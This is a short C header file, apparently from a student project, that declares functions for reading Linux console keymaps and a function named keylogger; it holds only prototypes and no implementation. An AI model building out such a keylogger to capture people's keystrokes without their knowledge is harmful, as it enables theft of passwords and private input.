/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.h                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef MAIN_H
# define MAIN_H

# include <linux/keyboard.h>

# ifndef MAX_NR_KEYMAPS
#  define MAX_NR_KEYMAPS NR_KEYMAPS
# endif

int				get_console();
int				get_keymaps(int, int **);
int				**get_keys(int, int, int, int **);
char			*get_keyboard();
void			keylogger(int keybd, int **key_table, int capslock, int numlock);

#endif
